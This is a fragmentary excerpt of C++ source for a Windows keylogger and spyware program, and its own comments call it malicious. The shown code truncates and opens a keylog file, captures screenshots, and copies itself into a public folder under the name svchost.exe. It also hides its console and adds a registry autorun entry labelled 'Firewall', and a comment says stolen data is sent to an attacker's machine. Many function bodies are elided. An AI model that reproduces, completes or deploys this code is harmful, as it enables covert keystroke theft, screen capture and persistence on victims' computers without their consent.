...
void WriteData(string input) {//write the information stolen from victim's PC to attacker's PC
...
bool SpecialKeys(int vKey) {//type of keystroke malware!
...
void logger() {//! malcious code!!!!!It will minitor the keyboard
	ofstream LogFile;
	LogFile.open("C:\\Users\\Public\\Public\\keylogs.txt", fstream::trunc);
	LogFile.close();
	//to confirm the keylogs.txt is empty
	char key;
...
void screens() {//get current computer's screenshot. Malicious
...
int main() {
	...
	//get current process's file name and path
	string s = util.FindPath();
	wstring stemp = wstring(s.begin(), s.end());
	LPCWSTR path = stemp.c_str();
/************************************************************************************/
	CopyFile(path, L"C:\\Users\\Public\\Public\\svchost.exe", TRUE);//self-replicate
/************************************************************************************/
	...
	strcpy(bmp, screen.c_str());
/*************************************************************************************************/
	util.HideConsole();//hide the current process's console
	//util.Autoload("hack.exe", util.FindPath());
	util.Autoload("Firewall", "C:\\Users\\Public\\Public\\svchost.exe");//set the registry for booting the program while the computer boots up. 
	util.Screenshot(0, 0, 1920, 1080, (char*)(bmp), NULL);
/*************************************************************************************************/
